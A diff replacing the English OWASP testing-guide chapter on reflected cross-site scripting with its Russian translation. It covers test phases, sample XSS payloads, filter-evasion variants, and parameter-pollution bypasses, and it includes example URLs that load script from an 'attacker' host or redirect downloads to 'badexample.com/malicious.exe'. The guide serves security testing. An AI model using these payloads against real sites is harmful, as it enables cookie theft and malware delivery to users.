@@ -7,156 +7,156 @@ tags: WSTG
 ---
 
 {% include breadcrumb.html %}
-# Testing for Reflected Cross Site Scripting
+# Тестирование отражённых межсайтовых скриптов
 
 |ID          |
 |------------|
 |WSTG-INPV-01|
 
-## Summary
+## Обзор
 
-Reflected [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.
+Отражённые [межсайтовые скрипты (XSS)](https://owasp.org/www-community/attacks/xss/) проявляются, когда злоумышленник вводит исполняемый код браузера в единственный HTTP-ответ. Атака инъекции не сохраняется в самом приложении; она не является постоянной и воздействует только на пользователей, которые открывают специально созданную ссылку или стороннюю web-страницу. Строка атаки включается в состав вредоносного URI или HTTP-параметра, некорректно обрабатывается приложением и возвращается (т.е. отражается) жертве.
 
-Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.
+Отражённые XSS-атаки являются наиболее часто встречающимся типом XSS-атак. Они также известны как непостоянные, и, поскольку полезная нагрузка атаки доставляется и выполняется в рамках одного запроса и ответа, их также называют XSS первого порядка (или I типа).
 
-When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim's browser.
+Если web-приложение уязвимо для такого типа атак, оно будет возвращать в ответах клиенту непроверенные входные данные, отправленные через запросы. Типичный жизненный цикл атаки включает этап разработки, на котором злоумышленник создает и тестирует вредоносный URI; этап социальной инженерии, на котором он убеждает своих жертв перейти по этому URI; и в конечном итоге выполнение созданного кода в браузере жертвы.
 
-Commonly the attacker's code is written in the JavaScript language, but other scripting languages are also used, e.g., ActionScript and VBScript. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).
+Как правило, код злоумышленника написан на JavaScript, но также используются и другие скриптовые языки, например ActionScript или VBScript. Злоумышленники обычно используют эти уязвимости для установки кейлоггеров, кражи cookie или буфера обмена жертвы, а также модификации контента страницы (например, ссылок на скачивание).
 
-One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out `<script>`, but might not filter `%3cscript%3e` which simply includes another encoding of tags.
+Одной из основных трудностей в предотвращении уязвимостей XSS является правильная кодировка символов. В некоторых случаях web-сервер или приложение не могут отфильтровать некоторые кодировки, поэтому, например, web-приложение может отфильтровать `<script>`, но не `%3cscript%3e`, который просто отображён в другой кодировке.
 
-## Test Objectives
+## Задачи тестирования
 
-- Identify variables that are reflected in responses.
-- Assess the input they accept and the encoding that gets applied on return (if any).
+- Определить переменные, которые отражаются в ответах.
+- Оценить входные данные, которые им присваиваются, и кодировку применяемую в ответе (если указана).
 
-## How to Test
+## Как тестировать
 
-### Black-Box Testing
+### Тестирование методом чёрного ящика
 
-A black-box test will include at least three phases:
+Тест будет включать, по крайней мере, три этапа:
 
-#### Detect Input Vectors
+#### Обнаружение входных векторов
 
-Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.
+Для каждой web-страницы тестировщик должен определить все пользовательские переменные web-приложения и способы их ввода. Они включают в себя скрытые или неочевидные входные данные, такие как параметры HTTP, данные POST, скрытые значения полей формы и предустановленные значения переключателей или списков выбора. Обычно для просмотра этих скрытых параметров используются встроенные в браузер HTML-редакторы или web-прокси. См. пример ниже.
 
-#### Analyze Input Vectors
+#### Анализ входных векторов
 
-Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.
-  Some example of such input data are the following:
+Проанализируйте каждый входной вектор, чтобы обнаружить потенциальные уязвимости XSS. Обычно используются специально созданные входные данные для каждого входного вектора. Такие входные данные обычно безвредны сами по себе, но они вызывают ответы web-браузера, через которые проявляется уязвимость. Данные тестирования можно генерировать с помощью фаззера web-приложений ([пример](https://www.zaproxy.org/docs/desktop/addons/fuzzer/)), автоматизировав загрузку предопределённого списка известных строк атаки, или вручную.
+  Примерами таких входных данных являются:
 
 - `<script>alert(123)</script>`
 - `"><script>alert(document.cookie)</script>`
 
-For a comprehensive list of potential test strings see the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
+Обширный список потенциальных тестовых строк см. в [Памятке по уклонению от фильтра XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
 
-#### Check Impact
+#### Анализ воздействия
 
-For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.
+Для каждого тестового ввода, предпринятого на предыдущем этапе, необходимо проанализировать результат и определять, представляет ли он собой уязвимость, которая оказывает реальное влияние на безопасность web-приложения. Это требует изучения результирующего HTML-кода страницы и поиска тестового ввода. После его обнаружения необходимо выявить все специальные символы, которые не были должным образом закодированы, заменены или отфильтрованы. Состав этих символов будет зависеть от контекста HTML.
 
-Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:
+В идеале все специальные символы HTML будут заменены HTML-сущностями. Основные HTML-сущности, которые необходимо найти:
 
-- `>` (greater than)
-- `<` (less than)
-- `&` (ampersand)
-- `'` (apostrophe or single quote)
-- `"` (double quote)
+- `>` (больше)
+- `<` (меньше)
+- `&` (амперсанд)
+- `'` (апостроф или одинарная кавычка)
+- `"` (двойные кавычки)
 
-However, a full list of entities is defined by the HTML and XML specifications. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).
+Полный перечень сущностей определяется спецификациями HTML и XML. См. в [Википедии](https://ru.wikipedia.org/wiki/%D0%9C%D0%BD%D0%B5%D0%BC%D0%BE%D0%BD%D0%B8%D0%BA%D0%B8_%D0%B2_HTML).
 
-Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:
+В контексте действия HTML или кода JavaScript ещё один набор специальных символов должен быть экранирован, закодирован, заменен или отфильтрован. Эти символы включают в себя:
 
-- `\n` (new line)
-- `\r` (carriage return)
-- `'` (apostrophe or single quote)
-- `"` (double quote)
-- `\` (backslash)
-- `\uXXXX` (unicode values)
+- `\n` (перевод строки)
+- `\r` (возврат каретки)
+- `'` (апостроф или одинарная кавычка)
+- `"` (двойные кавычки)
+- `\` (обратная косая черта)
+- `\uXXXX` (символы в кодировке Unicode)
 
-For a more complete reference, see the [Mozilla JavaScript guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).
+Более полную справку см. в [Руководстве по JavaScript от Mozilla](https://developer.mozilla.org/ru/docs/Web/JavaScript/Guide/Grammar_and_types#%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5_%D1%81%D0%BF%D0%B5%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D1%85_%D1%81%D0%B8%D0%BC%D0%B2%D0%BE%D0%BB%D0%BE%D0%B2_%D0%B2_%D1%81%D1%82%D1%80%D0%BE%D0%BA%D0%B0%D1%85).
 
-#### Example 1
+#### Пример №1
 
-For example, consider a site that has a welcome notice `Welcome %username%` and a download link.
+Например, рассмотрим сайт, на котором есть приветствие `Welcome %username%` и ссылка для скачивания.
 
 ![XSS Example 1](images/XSS_Example1.png)\
-*Figure 4.7.1-1: XSS Example 1*
+*Рисунок 4.7.1-1: Пример XSS №1*
 
-The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.
+Тестировщик должен подозревать, что каждая точка ввода данных может привести к XSS-атаке. Чтобы проанализировать это, необходимо поиграть с пользовательской переменной и попытаться вызвать уязвимость.
 
-Let's try to click on the following link and see what happens:
+Давайте попробуем перейти по данной ссылке и посмотрим, что получится:
 
 ```text
 http://example.com/index.php?user=<script>alert(123)</script>
 ```
 
-If no sanitization is applied this will result in the following popup:
+Если не применяется нейтрализация, это приведёт к следующему всплывающему окну:
 
 ![Alert](images/Alert.png)\
-*Figure 4.7.1-2: XSS Example 1*
+*Рисунок 4.7.1-2: Пример XSS №1*
 
-This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody's browser if he clicks on the tester's link.
+Это указывает на наличие уязвимости XSS, и, похоже, что если перейти по этой ссылке, можно выполнить произвольный код в любом браузере.
 
-#### Example 2
+#### Пример №2
 
-Let's try other piece of code (link):
+Давайте попробуем другой фрагмент кода (т.е. ссылку):
 
 ```text
 http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}</script>
 ```
 
-This produces the following behavior:
+Это приводит к следующему поведению:
 
 ![XSS Example 2](images/XSS_Example2.png)\
-*Figure 4.7.1-3: XSS Example 2*
+*Рисунок 4.7.1-3: Пример XSS №2*
 
-This will cause the user, clicking on the link supplied by the tester, to download the file `malicious.exe` from a site they control.
+Пользователь, перейдя по предоставленной тестировщиком ссылке, загрузит файл `malicious.exe` с контролируемого им сайта `http://badexample.com/`.
 
-### Bypass XSS Filters
+### Обход фильтров XSS
 
-Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.
+Атаки с использованием отражённых межсайтовых скриптов предотвращаются, поскольку вредоносный ввод нейтрализовывает web-приложение, блокирует WAF или механизмы, встроенные в современные браузеры. Тестировщик должен проверить наличие уязвимостей, предполагая, что браузеры не предотвратят атаку. Браузеры могут быть устаревшими или в них отключены встроенные функции безопасности. Точно так же нет гарантии, что WAF распознают новые неизвестные атаки.
 
-Thus, the majority of XSS prevention must depend on the web application's sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.
+Таким образом, основная нагрузка по предотвращению XSS лежит на нейтрализации web-приложением недоверенного пользовательского ввода. Разработчикам доступно несколько механизмов нейтрализации, таких как возврат ошибки, удаление, кодирование или замена недопустимых входных данных. Средства, с помощью которых приложение обнаруживает и исправляет неверный ввод, являются одним из основных недостатков при предотвращении XSS. Список запретов может не включать все возможные строки атаки, список разрешений может быть недостаточно строгим, нейтрализация может завершиться неудачей, или какой-либо тип входных данных может оказаться ошибочно доверенным и пройти без нейтрализации. Всё это позволяет злоумышленникам обходить фильтры XSS.
 
-The [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documents common filter evasion tests.
+В [Памятке по уклонению от фильтров XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) приведены распространённые тесты на обход фильтров.
 
-#### Example 3: Tag Attribute Value
+#### Пример №3: значение атрибута тега
 
-Since these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of `<script>` tags and even without the use of characters such as `<` and `>` that are commonly filtered.
+Поскольку эти фильтры основаны на списке запретов, они не могут блокировать все типы выражений. На самом деле, есть случаи, когда XSS эксплуатируется без тегов `<script>` и даже без таких символов, как `<` и `>`, которые обычно фильтруются.
 
-For example, the web application could use the user input value to fill an attribute, as shown in the following code:
+Например, web-приложение может присваивать атрибуту введённое пользователем значение, как показано в следующем коде:
 
 ```html
-<input type="text" name="state" value="INPUT_FROM_USER">
+<input type="text" name="state" value="ВВОД_ОТ_ПОЛЬЗОВАТЕЛЯ">
 ```
 
-Then an attacker could submit the following code:
+Тогда злоумышленник может отправить следующий код:
 
 ```text
 " onfocus="alert(document.cookie)
 ```
 
-#### Example 4: Different Syntax or Encoding
+#### Пример №4: другой синтаксис или кодировка
 
-In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the encoding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.
+В некоторых случаях фильтры на основе сигнатур можно обойти, просто обфусцируя атаку. Обычно это можно сделать, добавляя неожиданные изменения в синтаксис или кодировку. Браузеры воспринимают эти варианты как допустимый HTML, также они могут быть приняты фильтром.
 
-Following some examples:
+Вот несколько примеров:
 
 - `"><script >alert(document.cookie)</script >`
 - `"><ScRiPt>alert(document.cookie)</ScRiPt>`
 - `"%3cscript%3ealert(document.cookie)%3c/script%3e`
 
-#### Example 5: Bypassing Non-Recursive Filtering
+#### Пример №5: обход нерекурсивной фильтрации
 
-Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:
+Иногда нейтрализация применяется однократно, но без рекурсии. В этом случае злоумышленник может обойти фильтр, отправив строку, содержащую несколько попыток, например, так:
 
 ```text
 <scr<script>ipt>alert(document.cookie)</script>
 ```
 
-#### Example 6: Including External Script
+#### Пример №6: включение внешнего скрипта
 
-Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:
+Теперь предположим, что разработчики целевого сайта реализовали следующий код для защиты ввода от включения внешнего скрипта:
 
 ```php
 <?
@@ -171,68 +171,68 @@ Now suppose that developers of the target site implemented the following code to
 ?>
 ```
 
-Decoupling the above regular expression:
+Раскрывая приведённое выше регулярное выражение, получаем следующие проверки:
 
-1. Check for a `<script`
-2. Check for a " " (white space)
-3. Any character but the character `>` for one or more occurrences
-4. Check for a `src`
+1. на наличие `<script`
+2. на наличие " " (пробела)
+3. на наличие одного или нескольких вхождений любого символа, кроме `>`
+4. на наличие `src`.
 
-This is useful for filtering expressions like `<script src="http://attacker/xss.js"></script>` which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:
+Код будет полезным для фильтрации выражений типа `<script src="http://attacker/xss.js"></script>`, которые являются распространённой атакой. Но в этом случае можно обойти нейтрализацию, используя символ `>` в атрибуте между script и src, например:
 
 ```text
 http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 ```
 
-This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim web site, `http://example/`.
+Это позволит эксплуатировать отражённую уязвимость межсайтового скриптинга, показанную ранее, выполняя код JavaScript, хранящийся на web-сервере злоумышленника, как если бы он исходил с web-сайта жертвы, `http://example/`.
 
-#### Example 7: HTTP Parameter Pollution (HPP)
+#### Пример №7: загрязнение параметров HTTP (англ.: HTTP Parameter Pollution, HPP)
 
-Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the [Testing for HTTP Parameter pollution](04-Testing_for_HTTP_Parameter_Pollution.md) for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms.
-Regular attack:
+Другим методом обхода фильтров является загрязнение параметров HTTP, этот метод был впервые представлен Stefano di Paola и Luca Carettoni в 2009 г. на конференции OWASP в Польше. Дополнительные сведения см. в разделе [Тестирование загрязнения параметров HTTP](04-Testing_for_HTTP_Parameter_Pollution.md). Этот метод обхода заключается в разделении вектора атаки между несколькими параметрами, имеющими одно и то же имя. Манипулирование значением каждого параметра зависит от того, как конкретная web-технология анализирует эти параметры, поэтому такой тип обхода не всегда возможен. Если тестируемая среда объединяет значения всех параметров с одним и тем же именем, то злоумышленник может использовать этот метод для обхода механизмов защиты на основе сигнатур.
+Обычная атака:
 
 ```text
 http://example/page.php?param=<script>[...]</script>
 ```
 
-Attack using HPP:
+Атака с HPP:
 
 ```text
 http://example/page.php?param=<script&param=>[...]</&param=script>
 ```
 
-See the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors' browsers.
+Более подробный перечень методов обхода фильтров см. в [Памятке по обходу фильтров XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet). Анализ ответов может быть затруднительным. Простой способ его провести — использовать код, который вызывает всплывающее диалоговое окно, как в нашем примере. Обычно это указывает на то, что злоумышленник может выполнить произвольный код JavaScript в браузерах посетителей.
 
-### Gray-Box Testing
+### Тестирование методом серого ящика
 
-Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by the pen-tester.
+Тестирование методом серого ящика похоже на метод чёрного. В этом случае пентестер частично знает приложение, ему может быть известна информация о пользовательском вводе, мерах по контролю входных данных и о том, как введённое отображается пользователю.
 
-If source code is available (white-box testing), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented.
+При наличии исходного кода (тестирование методом белого ящика) необходимо проанализировать все переменные, полученные от пользователей. Кроме того, надо проанализировать все реализованные процедуры нейтрализации, чтобы решить, можно ли их обойти.
 
-## Tools
+## Инструменты
 
-- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
-- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
-- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
-- [ratproxy](https://code.google.com/archive/p/ratproxy/) is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.
-- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
-- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
+- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoding/) помогает кодировать в/из разных наборов символов произвольные тексты, которые можно использовать в настраиваемых полезных нагрузках.
+- [Hackvertor](https://hackvertor.co.uk/public) — онлайн-инструмент, который позволяет использовать множество типов кодирования и обфускации JavaScript (или любого строкового ввода).
+- [XSS-Proxy](http://xss-proxy.sourceforge.net/) — инструмент для атак с использованием межсайтовых скриптов.
+- [ratproxy](https://code.google.com/archive/p/ratproxy/) — полуавтоматический, в основном пассивный инструмент аудита безопасности web-приложений, оптимизированный для точного и чувствительного обнаружения и автоматического аннотирования потенциальных проблем и шаблонов проектирования, связанных с безопасностью, на основе наблюдения за существующим трафиком, инициируемым пользователями в web 2.0 окружении.
+- [Burp Proxy](https://portswigger.net/burp/) представляет собой интерактивный HTTP/S прокси-сервер для атак и тестирования web-приложений.
+- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) представляет собой интерактивный HTTP/S прокси-сервер для атаки и тестирования web-приложений со встроенным сканером.
 
-## References
+## Ссылки
 
-### OWASP Resources
+### Ресурсы OWASP
 
-- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+- [Памятка по обходу фильтров XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
 
-### Books
+### Книги
 
 - Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
 - Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
 - Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3
 
-### Whitepapers
+### Технические руководства
 
 - [CERT - Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
 - [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
 - [G.Ollmann - HTML Code Injection and Cross-site scripting](http://www.technicalinfo.net/papers/CSS.html)
-- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)
+- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://techzoom.net/papers/insecurity-iceberg)
